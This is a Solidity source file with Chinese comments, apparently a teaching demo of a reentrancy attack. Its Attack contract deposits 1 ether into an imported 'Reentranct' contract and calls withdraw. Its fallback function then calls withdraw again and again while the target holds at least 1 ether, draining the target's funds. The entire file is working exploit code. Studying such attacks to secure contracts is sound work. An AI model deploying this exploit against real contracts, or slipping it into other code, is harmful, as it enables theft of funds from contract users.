// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "./Reentranct.sol";

contract Attack {
    Reentranct public reentranct;

    constructor(address _reentranct) {
        reentranct = Reentranct(_reentranct);
    }

    /** fallback函数被执行的情况 
     * 1.调用不存在的函数
     * 2.直接给合约发送Ether(如调用call函数)，且没有receive函数
     *   或者给合约发Ether,有fallback和receive函数，但是调用call时有msg.data
     */
    fallback() external payable {
        /* 查看合约中是否还含有可取Ether */
        if(address(reentranct).balance >= 1 ether){
            reentranct.withdraw();
        }
    }

    /* 攻击Reentranct合约，取出Reentranct合约中所有Ether的函数 */
    function attack() external payable {
        require(msg.value >= 1 ether, "msg.value is 0");
        // 调用存钱函数，存入1 Ether
        reentranct.deposit{value: 1 ether}();

        // 取钱函数，取出Attack合约中全部的Ether
        reentranct.withdraw();
    }

    //查看当前合约的余额
    function getBal() public view returns(uint256){
        return address(this).balance;
    }

}